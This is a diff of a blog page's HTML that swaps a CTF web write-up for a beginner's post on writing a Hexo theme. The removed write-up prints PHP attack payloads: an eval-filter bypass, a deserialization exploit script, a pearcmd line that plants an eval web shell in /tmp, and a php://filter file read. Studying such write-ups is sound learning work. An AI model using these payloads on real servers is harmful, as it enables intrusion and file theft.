@@ -187,10 +187,10 @@
         <div class="fleet-body flex-col w-full">
             <div class="fleet-header">
                 <div class="fleet-content-header-title text-6xl">
-                    <h1 class="inline-block font-extrabold mt-16 mb-8">黄河流域公安院校网络空间安全技能挑战赛WP</h1>
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">初探前端世界-Hexo编写主题</h1>
                 </div>
                 <div class="fleet-content-header-info">
-                    <span>2023/03/12 20:30:57</span>
+                    <span>2024/01/31 16:24:57</span>
                 </div>
             </div>
             <div class="divider w-full"></div>
@@ -204,183 +204,25 @@
                         <!--图片-->
                         
                         <article class="prose">
-                            <blockquote>
-<p>WP原文：<a target="_blank" rel="noopener" href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#</a></p>
-</blockquote>
+                            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前用久了butterfly的主题发现感觉很不错，于是想简单设计编写一个比较符合自己审美的静态页面，不仅仅作为博客，而是说作为一个自己的个人想法或者介绍的集锦等等。<br>于是在这个假期开始，我用了几天时间从学习到写出了一简单的Demo。他现在作为一个完整应用有些过早，但是用来简单展示是完全足够的。<br>注意，由于我是一个学习前端的新手，而且不会使用各种优秀的前端框架，甚至不明白如何用Nodejs编译，导致我完全只能用CDN的js来进行开发。</p>
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>我选择了TailwindCSS和DaisyUI，引用CDN文件之后，在class中添加一些标记来让元素获得CSS样式，可能和BootStrap类似？如果你也想使用这两个库，阅读它们的官方手册来学习他们的用法。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.tailwindcss.cn/docs/installation">TailwindCSS Docs</a></li>
+<li><a target="_blank" rel="noopener" href="https://daisyui.com/docs/install/">DaisyUI Docs</a></li>
+</ul>
+<p>当然，如果不清楚Hexo的主题基本写法，用起来也会很难受，下面这个是Hexo的官方文档和基础方面的简单教程：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/smileyan9/article/details/124268248">《Hexo: 从零开始编写自己的主题》</a></li>
+<li><a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo官方文档</a></li>
+</ul>
+<p>有这四个链接其实就足够了。Hexo的主题主要是对EJS的编写，也就是对于NodeJs的模板语言，如果不需要对脚本的开发，仅仅需要的只是基础语言逻辑。</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>接下来就是去构思你想要的结构样式了。这段你需要充分使用hexo的基础文档，比如如何引用一些配置参数、如何去构建标签页、如何构建链接等基础功能。<br>等到这些都可以完成之后，就可以进行一些美化、或者添加一些功能。<br>比如说搜索功能：</p>
 <blockquote>
-<p>就做出来了一个ezphp，而且还是靠google原题嗯抄的，学习之路真是任重而道远。</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/685bf59cde5e">https://www.jianshu.com/p/685bf59cde5e</a></p>
 </blockquote>
-<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004599199-79d1bc55-533b-463b-b116-f14a209b86d7.png" alt="9956ef16896bd6c730cea9b401218c2.png"></p>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
+<p>fancyBox功能、Markdown渲染等等，Fancybox前面的连接中有提到如何解决，但是Markdown渲染是一个问题，我选择的方案是让DaisyUI的库来转换而不是Hexo的库，然后让前端js来修改渲染，这也就导致了页面的访问速度本身就慢，再加上渲染速度，使用起来效果很差。但勉强也算解决了问题。<br>然后解决了基础问题之后就要可以来添加一些美化：<br>比如设计一个你喜欢的首页：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706687979978-370a48a2-cf55-4afc-94f2-7aa85430b58d.png" alt="image.png"><br>如果你仔细查看了DaisyUI，会发现有一个简单、直接的切换主题的方式。来方便你选择颜色。甚至支持自定义颜色。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688120249-92f15864-c0a8-4315-8389-64079e7012c0.png" alt="image.png"><br>设计你的个人介绍页面。（参考了最近比较火的Bento风格），我甚至花了一天时间用我本没多少的美术能力花了个像素风格的Furriran。但是其实可以一眼才看出来原作是ai。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688224196-86ceb838-13ff-443b-811f-24f9187c2efb.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688206553-62c5be49-cb26-476e-8b3a-46119f72a006.png" alt="image.png"><br>以及一个简单的导航和友链页面：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706688292983-c489b5d6-852c-4841-8c3d-f26d1f076621.png" alt="image.png"><br>等等。这仅仅只需要你有简单的Tailwindcss基础即可，大概两天，你就可以熟练使用它。<br>你可以访问：<a href="https://blog.natro92.fun/">https://blog.natro92.fun</a> 来查看它的Demo。<br>我把这个主题叫做Lupas，因为我更喜欢它的黑色模式。<br>搭建的时候可以尝试使用Vercel来搭建静态页面替代Github Pages。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>即使是设计了很久，想了很多，但是由于自身的能力限制，以及作为一个新手，我并不能完成我自己的设想，想象的实际上的结果并不完全相同，再加上设计能力本身的缺失和一些技术的缺少，比如手机端的显示、一些动画效果等等，如果有时间我会逐渐补全完善它的。</p>
 
-$num &#x3D; $_GET[&#39;num&#39;];
-
-if (preg_match(&quot;&#x2F;\&#39;|\&quot;|\&#96;| |&lt;|&gt;|?|\^|%|\$&#x2F;&quot;, $num)) &#123;
-           die(&quot;nononno&quot;);
-&#125;
-
-if (eval(&quot;return $&#123;num&#125; !&#x3D; 2;&quot;) &amp;&amp; $num &#x3D;&#x3D; 0 &amp;&amp; is_numeric($num) !&#x3D; true) &#123;
- system(&#39;cat flag.php&#39;);
-&#125; else &#123;
- echo &#39;2&#39;;
-&#125;</code></pre>
-
-<p>题目主要考察的是php的运算符的比较级。<br>payload：<code>?num=1|2</code><br>flag在源代码里面。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001464588-77225b4a-cf0b-4a51-8212-30b8bd77afa1.png" alt="image.png"></p>
-<h2 id="funnyPHP"><a href="#funnyPHP" class="headerlink" title="funnyPHP"></a>funnyPHP</h2><p>上来给出的地址是：<code>/hint.php</code>，页面下为<code>phpinfo()</code>参数页面：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001660449-14587bf3-10c9-476f-a1e9-22d501efdc52.png" alt="image.png"><br>访问根目录<code>/</code>出现以下情况：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001606854-f0128886-182c-4eb5-9172-6c0387e9e027.png" alt="image.png"><br>这里为 PHP Development Server 启动的服务。然后就出现了本题的考点：</p>
-<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞"></a>PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a><br><a target="_blank" rel="noopener" href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p>
-</blockquote>
-<p>我最开始在bp中手动输入那个\r\n但是发现不行，经过尝试才知道需要先关闭<code>Updates COntentLength</code>并且打开<code>hide non—printable chars</code>，这两个分别在以下位置：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002498712-172f96c6-35b8-4f31-b5f9-d17c822dc312.png" alt="image.png"><br>和<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002518945-25f2f952-9851-4f47-ba31-d199acf26ce3.png" alt="image.png"><br>分别打开之后，按照以下格式发送即可。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002554239-5388e99a-8075-4082-a0a1-3b696ffb131b.png" alt="image.png"><br>之后就能够获得到puzzle.php的内容。其中考察的是php的反序列化。</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-error_reporting(0);
-
-class A&#123;
-    public $sdpc &#x3D; [&quot;welcome&quot; &#x3D;&gt; &quot;yeah, something hidden.&quot;];
-
-    function __call($name, $arguments)
-    &#123;
-        $this-&gt;$name[$name]();
-    &#125;
-
-&#125;
-
-
-class B&#123;
-    public $a;
-
-    function __construct()
-    &#123;
-        $this-&gt;a &#x3D; new A();
-    &#125;
-
-    function __toString()
-    &#123;
-        echo $this-&gt;a-&gt;sdpc[&quot;welcome&quot;]; &#x2F;&#x2F;对大家表示欢迎
-    &#125;
-
-&#125;
-
-class C&#123;
-    public $b;
-    protected $c;
-
-    function __construct()&#123;
-        $this-&gt;c &#x3D; new B();
-    &#125;
-
-    function __destruct()&#123;
-        $this-&gt;b ? $this-&gt;c-&gt;sdpc(&#39;welcom&#39;) : &#39;welcome!&#39;.$this-&gt;c; &#x2F;&#x2F;变着法欢迎大家
-    &#125;
-&#125;
-
-class Evil&#123;
-    function getflag() &#123;
-        echo file_get_contents(&#39;&#x2F;fl4g&#39;);
-    &#125;
-&#125;
-
-
-if(isset($_POST[&#39;sdpc&#39;])) &#123;
-    unserialize($_POST[&#39;sdpc&#39;]);
-&#125; else &#123;
-    serialize(new C());
-&#125;
-?&gt;</code></pre>
-
-<p>exp.php</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-error_reporting(0);
-
-class A
-&#123;
-    public $sdpc;
-
-    function __construct() &#123;
-        $this-&gt;sdpc &#x3D; array(&quot;sdpc&quot; &#x3D;&gt; array(new Evil(),&#39;getflag&#39;));
-    &#125;
-
-    function __call($name, $arguments)
-    &#123;
-
-        $name[$arguments]();
-    &#125;
-&#125;
-
-
-class B
-&#123;
-    public $a;
-
-    function __construct()
-    &#123;
-        $this-&gt;a &#x3D; new A();
-    &#125;
-
-    function __toString()
-    &#123;
-        echo $this-&gt;a-&gt;sdpc[&quot;welcome&quot;]; &#x2F;&#x2F;对大家表示欢迎
-    &#125;
-&#125;
-
-class C
-&#123;
-    public $b;
-    protected $c;
-
-    function __construct()
-    &#123;
-        $this-&gt;c &#x3D; new A();
-    &#125;
-
-    function __destruct()
-    &#123;
-        $this-&gt;b ? $this-&gt;c-&gt;sdpc(&#39;welcom&#39;) : &#39;welcome!&#39; . $this-&gt;c; &#x2F;&#x2F;设置 b ，触发 ___call
-    &#125;
-&#125;
-
-class Evil
-&#123;
-    function getflag()
-    &#123;
-        echo &#39;1&#39;;
-        file_get_contents(&#39;&#x2F;fl4g&#39;);
-    &#125;
-&#125;
-
-$ca &#x3D; new A();
-$cb &#x3D; new B();
-$cc &#x3D; new C();
-
-$cc-&gt;b &#x3D; &#39;sp4c1ous&#39;;
-
-
-echo urlencode(serialize($cc));</code></pre>
-
-<p>用post传入：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678003313844-de470c08-436b-496a-b1f6-193a5bd1252e.png" alt="image.png"></p>
-<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p>
-</blockquote>
-<p>pearcmd的利用，但是并不会。先把官方wp粘在这里吧。</p>
-<pre class="language-php" data-language="php"><code class="language-php">?+config-create+&#x2F;&amp;sdpc&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?eval($_POST[0]);?&gt;+&#x2F;tmp&#x2F;hello.php</code></pre>
-
-<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004112573-9e6a567b-86ce-4314-b98e-99214b391728.png" alt="output.png"></p>
-<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/284901">https://www.anquanke.com/post/id/284901</a></p>
-</blockquote>
-<p>就做出来了这一个，还是抄的。。。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677900359894-8183856c-3d9a-409b-9d34-eea5aff2dcb3.png" alt="image.png"></p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-$g &#x3D; $_GET[&#39;g&#39;];
-$t &#x3D; $_GET[&#39;t&#39;];
-echo new $g($t);</code></pre>
-
-<p>根据图片，直接传入payload：</p>
-<pre class="language-php" data-language="php"><code class="language-php">?g&#x3D;SplFileObject&amp;t&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre>
-
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><meta name="referrer" content="no-referrer" />
                             
                         </article>
                     </div>
@@ -391,20 +233,21 @@ echo new $g($t);</code></pre>
                         <div class="flex-row flex w-full justify-between">
                             <div class="fleet-content-body-footer-left">
                                 
-                                    <div><a href="/posts/609b154f/"
-                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/ac1fd128/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>Java反序列化之CC1</span></div>
                                             <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                  xmlns="http://www.w3.org/2000/svg"
                                                  width="24" height="24" viewBox="0 0 24 24">
-                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
                                             </svg>
-                                            <div class="flex flex-col items-start"><span
-                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
-                                                <span>uploads-lab之旅</span></div>
                                         </a></div>
-                                
-                            </div>
-                            <div class="fleet-content-body-footer-right">
+
                                 
                             </div>
                         </div>
